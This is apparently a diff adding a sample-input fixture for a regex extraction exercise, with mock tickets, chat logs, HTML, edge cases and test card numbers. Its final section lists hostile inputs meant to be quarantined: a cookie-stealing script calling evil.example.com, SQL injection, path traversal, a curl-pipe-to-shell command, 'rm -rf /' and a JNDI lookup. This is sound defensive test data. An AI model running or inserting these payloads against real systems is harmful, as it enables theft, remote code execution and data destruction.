@@ -1,0 +1,113 @@
+================================================================================
+ALU REGEX DATA EXTRACTION - SAMPLE RAW TEXT
+--------------------------------------------------------------------------------
+This file simulates the messy, real-world text an API or a web scraper would
+hand to our extractor: support tickets, invoices, chat logs, HTML fragments,
+and - deliberately - a few malicious / malformed payloads that MUST be rejected.
+================================================================================
+
+
+--------------------------------------------------------------------------------
+SECTION 1 - SUPPORT TICKET #4471 (email thread, mixed formatting)
+--------------------------------------------------------------------------------
+From: Aline Uwase <aline.uwase@alueducation.com>
+To: billing-support@example.co.uk, no-reply@shop.example.io
+Cc: "Ops Team" <ops.team+alerts@sub.domain.example.org>
+Sent: 2026-03-14 at 09:05 (see also 9:05 AM and 21:30 in the log below)
+
+Hi team,
+
+I tried to renew my subscription at https://shop.example.com/account/billing?plan=pro&ref=email
+but the page kept redirecting to http://legacy.example.net:8080/checkout#step-2.
+Your docs at https://docs.example.com/api/v2/payments were not helpful either.
+
+You can reach me on +250 788 123 456 or, if that fails, on my old line
+(555) 123-4567. My office desk is 555-987-6543 and the direct fax is
+555.246.8100. International escalation goes to +1 (415) 555-0132.
+
+The card I used ends in 1111 - full number was 4111 1111 1111 1111 (Visa).
+Finance also has 5500-0000-0000-0004 on file and an Amex 3782 822463 10005.
+Please note 1234 5678 9012 3456 is NOT one of ours - it fails the checksum.
+
+The failed charge was $1,299.00, plus a $49 rush fee and a EUR 25,00 handling
+charge that should never have been applied. Local pricing shows 150,000 RWF
+and the UK office was billed £2,450.75 while Tokyo saw ¥12,000.
+We were also quoted USD 3,500.50 for the annual plan.
+
+Thanks,
+Aline
+#urgent #billing #Payments2026 #alu_regex
+
+
+--------------------------------------------------------------------------------
+SECTION 2 - CHAT LOG (timestamps in mixed 12h / 24h formats)
+--------------------------------------------------------------------------------
+[09:05] agent.k@example.com: Ticket picked up.
+[9:05 AM] Aline: thanks!
+[11:30 PM] Aline: still broken
+[13:45:12] agent.k@example.com: escalating, see https://status.example.com
+[23:59] system: nightly job finished
+[00:00] system: rollover
+[7:30 a.m.] night_shift@example.dev: handover complete
+[12:00 PM] noon check - ok
+[25:99] <-- invalid, must NOT be captured
+[19:61] <-- invalid, must NOT be captured
+
+
+--------------------------------------------------------------------------------
+SECTION 3 - HTML FRAGMENT SCRAPED FROM THE INVOICE PAGE
+--------------------------------------------------------------------------------
+<div class="invoice" data-id="INV-2026-0031">
+  <h1>Invoice</h1>
+  <p>Amount due: <strong>$1,299.00</strong></p>
+  <a href="https://billing.example.com/invoice/2026-0031">View invoice</a>
+  <img src="https://cdn.example.com/logo.png" alt="Example Ltd" />
+  <br>
+  <span class="muted">Contact: billing@example.com</span>
+  <!-- internal note: retry window 15:00 -->
+</div>
+
+
+--------------------------------------------------------------------------------
+SECTION 4 - SOCIAL MENTIONS
+--------------------------------------------------------------------------------
+Loving the new dashboard #DataEngineering #regex #100DaysOfCode
+Colour token #ffffff and issue reference #12345 are NOT hashtags.
+Mixed: great work team!#ShipIt (no leading space, still a hashtag)
+Edge: # alone, ## double, and #_private_tag
+
+
+--------------------------------------------------------------------------------
+SECTION 5 - MALFORMED / EDGE CASES (should be skipped or flagged, not crash)
+--------------------------------------------------------------------------------
+not-an-email@                      -> incomplete
+@nodomain.com                      -> missing local part
+double..dots@example.com           -> consecutive dots
+user@localhost                     -> no public TLD
+ftp://files.example.com/dump.zip   -> non-http scheme
+http://                            -> no host
+tel:+250788123456                  -> not an http URL
+Phone-ish: 12-34, 1234567890123456789, (555) 12-34
+Card-ish: 4111-1111-1111            -> too short
+Time-ish: 99:99, 7:60 PM, 24:00
+
+
+--------------------------------------------------------------------------------
+SECTION 6 - HOSTILE INPUT (injection attempts - MUST be quarantined)
+--------------------------------------------------------------------------------
+<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>
+<img src=x onerror="alert('xss')">
+<iframe src="javascript:alert(document.domain)"></iframe>
+Click here: javascript:void(document.location='https://phish.example.com')
+Payload URL: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+admin' OR '1'='1' --
+'; DROP TABLE users; --
+UNION SELECT card_number, cvv FROM payments
+../../../../etc/passwd
+$(curl https://evil.example.com/rce.sh | sh)
+`rm -rf /`
+{{7*7}} and ${jndi:ldap://evil.example.com/a}
+Contact the "admin" at attacker@evil.example.com<script>x</script>
+================================================================================
+END OF SAMPLE INPUT
+================================================================================
